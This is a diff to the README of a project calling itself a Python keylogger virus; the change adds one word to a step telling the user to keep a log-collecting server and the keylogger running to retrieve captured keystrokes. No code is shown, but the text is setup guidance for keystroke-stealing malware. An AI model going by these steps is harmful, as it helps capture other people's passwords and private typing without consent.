@@ -8,7 +8,7 @@ Keylogger virus made in python
 
 2. Download executable file for server [here](https://github.com/Josakko/KeyLogger/releases/tag/http-server) (or use index.js if you are on linux machine and you don't want to use wine).
 
-3. Now just make sure that `server.exe` is running and also keylogger is running (if server isn't running while keylogger is running everything will still work but to retrieve saved logs you will need to just run server for some).
+3. Now just make sure that `server.exe` is running and also keylogger is running (if server isn't running while keylogger is running everything will still work but to retrieve saved logs you will need to just run server for some time).
 
 ## Need Help?
 
